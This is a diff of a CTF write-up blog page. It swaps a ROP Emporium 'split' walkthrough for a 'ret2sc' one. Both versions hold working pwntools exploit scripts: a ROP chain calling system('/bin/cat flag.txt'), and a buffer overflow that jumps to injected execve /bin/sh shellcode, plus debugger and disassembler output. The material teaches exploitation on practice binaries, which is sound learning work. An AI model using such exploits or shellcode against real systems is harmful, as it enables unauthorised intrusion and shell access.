@@ -16,28 +16,27 @@
   <meta name="author" content="Xiung">
   <meta name="keywords" content="">
   
-    <meta name="description" content="file split  1234$ file splitsplit: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;98755e64e1d0c1b">
+    <meta name="description" content="file ret2sc to take a look. 1234$ file ret2scret2sc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sh">
 <meta property="og:type" content="article">
-<meta property="og:title" content="split">
-<meta property="og:url" content="http://example.com/2022/01/12/split/index.html">
+<meta property="og:title" content="Writeup-ret2sc">
+<meta property="og:url" content="http://example.com/2021/11/01/Writeup-ret2sc/index.html">
 <meta property="og:site_name" content="Xiung&#39;s Blog">
-<meta property="og:description" content="file split  1234$ file splitsplit: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;98755e64e1d0c1b">
+<meta property="og:description" content="file ret2sc to take a look. 1234$ file ret2scret2sc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sh">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.imgur.com/6wijIYI.png">
-<meta property="og:image" content="https://i.imgur.com/nvN8Qsf.png">
-<meta property="og:image" content="https://i.imgur.com/NmfH83V.png">
-<meta property="article:published_time" content="2022-01-11T18:57:26.000Z">
-<meta property="article:modified_time" content="2022-10-02T09:45:57.070Z">
+<meta property="og:image" content="https://i.imgur.com/kkBkEOG.png">
+<meta property="og:image" content="https://i.imgur.com/WQSd5Zm.png">
+<meta property="article:published_time" content="2021-11-01T14:57:16.000Z">
+<meta property="article:modified_time" content="2022-10-02T10:05:19.246Z">
 <meta property="article:author" content="Xiung">
 <meta property="article:tag" content="CyberSecurity">
 <meta property="article:tag" content="PWN">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://i.imgur.com/6wijIYI.png">
+<meta name="twitter:image" content="https://i.imgur.com/kkBkEOG.png">
   
   
   
-  <title>split - Xiung&#39;s Blog</title>
+  <title>Writeup-ret2sc - Xiung&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +201,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="split"></span>
+            <span id="subtitle" data-typed-text="Writeup-ret2sc"></span>
           
         </div>
 
@@ -213,8 +212,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-01-12 02:57" pubdate>
-          January 12, 2022 am
+        <time datetime="2021-11-01 22:57" pubdate>
+          November 1, 2021 pm
         </time>
       </span>
     
@@ -225,7 +224,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.7k words
+          2.2k words
         
       </span>
     
@@ -236,7 +235,7 @@
         
         
         
-          23 mins
+          19 mins
         
       </span>
     
@@ -274,52 +273,40 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">split</h1>
+            <h1 style="display: none">Writeup-ret2sc</h1>
             
             
               <div class="markdown-body">
                 
                 <ol>
-<li><code>file split</code></li>
+<li><p><code>file ret2sc</code> to take a look.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ file ret2sc<br>ret2sc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), <br>dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, <br>BuildID[sha1]=b83f13f0a84fdae7a5bc54d828d0e4ea15575d6d, not stripped<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>gdb checksec to check the protection of this program.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gdb-peda ret2sc<br>Reading symbols from ret2sc...<br>(No debugging symbols found <span class="hljs-keyword">in</span> ret2sc)<br>gdb-peda$ checksec<br>CANARY    : disabled<br>FORTIFY   : disabled<br>NX        : disabled<br>PIE       : disabled<br>RELRO     : Partial<br>gdb-peda$<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><code>r2 ret2sc</code>, there’s nothing special.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ r2 ret2sc<br>[0x00400540]&gt; aa<br>[x] Analyze all flags starting with sym. and entry0 (aa)<br>[0x00400540]&gt; afl<br>0x00400540    1 41           entry0<br>0x00400500    1 6            sym.imp.__libc_start_main<br>0x00400570    4 50   -&gt; 41   sym.deregister_tm_clones<br>0x004005b0    4 58   -&gt; 55   sym.register_tm_clones<br>0x004005f0    3 28           sym.__do_global_dtors_aux<br>0x00400610    4 38   -&gt; 35   entry.init0<br>0x00400720    1 2            sym.__libc_csu_fini<br>0x00400724    1 9            sym._fini<br>0x004006b0    4 101          sym.__libc_csu_init<br>0x00400636    1 114          main<br>0x00400520    1 6            sym.imp.setvbuf<br>0x004004e0    1 6            sym.imp.printf<br>0x004004f0    1 6            sym.imp.read<br>0x00400510    1 6            sym.imp.gets<br>0x004004b0    3 26           sym._init<br>0x00400530    1 6            sym..plt.got<br>[0x00400540]&gt;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><code>s main</code>, <code>VV</code>. We saw there are two input, one is “name”, another is “try your best:”. the first will be put at <strong>0x601080</strong>, second will be put at <strong>var_20h(rbp-0x20)</strong>.</p>
+</li>
 </ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ file <span class="hljs-built_in">split</span><br><span class="hljs-built_in">split</span>: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), <br>dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 3.2.0, <br>BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped<br></code></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>gdb-peda, checksec</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gdb-peda <span class="hljs-built_in">split</span><br>Reading symbols from <span class="hljs-built_in">split</span>...<br>(No debugging symbols found <span class="hljs-keyword">in</span> <span class="hljs-built_in">split</span>)<br>gdb-peda$ checksec<br>CANARY    : disabled<br>FORTIFY   : disabled<br>NX        : ENABLED<br>PIE       : disabled<br>RELRO     : Partial<br>gdb-peda$<br></code></pre></td></tr></table></figure>
-
-<ol start="3">
-<li><code>r2 split</code>, <code>aa</code>, <code>afl</code>, I notice the special function <strong>pwnme</strong>, <strong>usefulFunction</strong>.</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x00400742]&gt; afl<br>0x004005b0    1 42           entry0<br>0x004005f0    4 42   -&gt; 37   sym.deregister_tm_clones<br>0x00400620    4 58   -&gt; 55   sym.register_tm_clones<br>0x00400660    3 34   -&gt; 29   sym.__do_global_dtors_aux<br>0x00400690    1 7            entry.init0<br>0x004006e8    1 90           sym.pwnme      ====&gt; this one<br>0x00400580    1 6            sym.imp.memset<br>0x00400550    1 6            sym.imp.puts<br>0x00400570    1 6            sym.imp.printf<br>0x00400590    1 6            sym.imp.read<br>0x00400742    1 17           sym.usefulFunction     ====&gt; this one<br>0x00400560    1 6            sym.imp.system<br>0x004007d0    1 2            sym.__libc_csu_fini<br>0x004007d4    1 9            sym._fini<br>0x00400760    4 101          sym.__libc_csu_init<br>0x004005e0    1 2            sym._dl_relocate_static_pie<br>0x00400697    1 81           main             ====&gt; this one<br>0x004005a0    1 6            sym.imp.setvbuf<br>0x00400528    3 23           sym._init<br></code></pre></td></tr></table></figure>
-
-<ol start="4">
-<li>I choose to see the main function first. It seems do nothing but print some strings.</li>
-</ol>
-<p><img src="https://i.imgur.com/6wijIYI.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
-<ol start="4">
-<li>go to see another function <strong>pwnme</strong>. we have a input which store at <strong>var_20h(rbp-0x20)</strong>.</li>
-</ol>
-<p><img src="https://i.imgur.com/nvN8Qsf.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<p><img src="https://i.imgur.com/kkBkEOG.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
 <ol start="5">
-<li>and the usefulfunction is below.</li>
+<li>by the result above, we need to find the place that we can inject our shellcode, use gdb-peda.<br><code>gde-peda ret2sc</code>, <code>b main</code>, <code>r</code></li>
 </ol>
-<p><img src="https://i.imgur.com/NmfH83V.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gdb-peda ret2sc<br>Reading symbols from ret2sc...<br>(No debugging symbols found <span class="hljs-keyword">in</span> ret2sc)<br>gdb-peda$ b main<br>Breakpoint 1 at 0x40063a<br>gdb-peda$ r<br></code></pre></td></tr></table></figure>
+
+<p>then <code>vmmap</code>, we found that address between 0x601000-0x602000 have permission of rwx, and our input “name” (0x601080) is in this range. so we can inject our shellcode here.</p>
+<p><img src="https://i.imgur.com/WQSd5Zm.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
 <ol start="6">
-<li>we use <code>iz</code> to find an <code>cat / flag.txt</code></li>
+<li>write the exploit script, shellcode can be found on the <a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes">exploit-db</a> website.</li>
 </ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x00400742]&gt; iz<br>[Strings]<br>nth paddr      vaddr      len size section <span class="hljs-built_in">type</span>  string<br>―――――――――――――――――――――――――――――――――――――――――――――――――――――――<br>0   0x000007e8 0x004007e8 21  22   .rodata ascii <span class="hljs-built_in">split</span> by ROP Emporium<br>1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n<br>2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting<br>3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user <span class="hljs-keyword">for</span> data...<br>4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!<br>5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls<br>0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt ===&gt; this one<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>ip = <span class="hljs-string">&quot;120.114.62.211&quot;</span><br>port = <span class="hljs-number">2122</span><br><br><span class="hljs-comment"># r = remote(ip,port)</span><br>r = process(<span class="hljs-string">&quot;./ret2sc&quot;</span>)<br><br>shellcode =\<br><span class="hljs-string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br><br>r.sendafter(<span class="hljs-string">&quot;:&quot;</span>, shellcode)<br><span class="hljs-comment"># r.recvuntil(&#x27;:&#x27;)</span><br><span class="hljs-comment"># r.sendline(shellcode)</span><br><br>shellcode_address = <span class="hljs-number">0x601080</span><br>r.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>)<br>r.sendline(<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x28</span> + p64(shellcode_address))<br><br>r.interactive()<br></code></pre></td></tr></table></figure>
 
 <ol start="7">
-<li><p>then we can write our expolit code.<br> we need to padding to the return address, it is 0x20 + 0x8(rbp), then the address of <code>pop rdi ; ret</code>, then address of <code>/bin/cat flag.txt</code>, and <code>sym.imp.system</code></p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">r</span> = process(&#x27;./split&#x27;)<br><span class="hljs-comment">#r = remote(&#x27;120.114.62.211&#x27;, 6126)</span><br><br><span class="hljs-attribute">padding</span> = b&#x27;A&#x27;*<span class="hljs-number">40</span><br><span class="hljs-attribute">pop_rdi</span> = <span class="hljs-number">0</span>x4007c3<br><span class="hljs-attribute">cat_flag</span> = <span class="hljs-number">0</span>x601060<br><span class="hljs-attribute">syscall</span> = <span class="hljs-number">0</span>x400560<br><br><span class="hljs-comment"># payload = padding</span><br><span class="hljs-comment"># payload += p64(pop_rdi)</span><br><span class="hljs-comment"># payload += p64(cat_flag)</span><br><span class="hljs-comment"># payload += p64(syscall)</span><br><br><span class="hljs-attribute">r</span>.sendline(padding + p64(pop_rdi) + p64(cat_flag) + p64(syscall))  #if <span class="hljs-number">64</span> bit ,or <span class="hljs-number">32</span>bit use p32<br><br><span class="hljs-attribute">r</span>.interactive()<br></code></pre></td></tr></table></figure>
-</li>
-<li><p>then we can run the code and get the flag.</p>
-</li>
+<li>run the code and then we can get the shell, find the flag and print it.</li>
 </ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python3 exploit_split.py<br>[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./split&#x27;</span>: pid 155<br>[*] Switching to interactive mode<br><span class="hljs-built_in">split</span> by ROP Emporium<br>x86_64<br><br>Contriving a reason to ask user <span class="hljs-keyword">for</span> data...<br>&gt; Thank you!<br>ROPE&#123;a_placeholder_32byte_flag!&#125;<br>[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive<br>$<br></code></pre></td></tr></table></figure>
-<p>ROPE{a_placeholder_32byte_flag!}</p>
 
                 
               </div>
@@ -338,7 +325,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/Write-up/" class="category-chain-item">Write-up</a>
+  <a href="/categories/Writeup/" class="category-chain-item">Writeup</a>
   
   
 
@@ -369,8 +356,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>split</div>
-      <div>http://example.com/2022/01/12/split/</div>
+      <div>Writeup-ret2sc</div>
+      <div>http://example.com/2021/11/01/Writeup-ret2sc/</div>
     </div>
     <div class="license-meta">
       
@@ -382,7 +369,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>January 12, 2022</div>
+          <div>November 1, 2021</div>
         </div>
       
       
@@ -414,9 +401,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/04/05/python3-ssh-%E5%82%B3%E6%AA%94%E6%A1%88/" title="python3 ssh 傳檔案">
+                      <a href="/2021/11/03/ROP/" title="ROP">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">python3 ssh 傳檔案</span>
+                        <span class="hidden-mobile">ROP</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -424,8 +411,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/01/10/pass/" title="pass">
-                        <span class="hidden-mobile">pass</span>
+                      <a href="/2021/11/01/Writeup-ret2win/" title="Writeup-ret2win">
+                        <span class="hidden-mobile">Writeup-ret2win</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
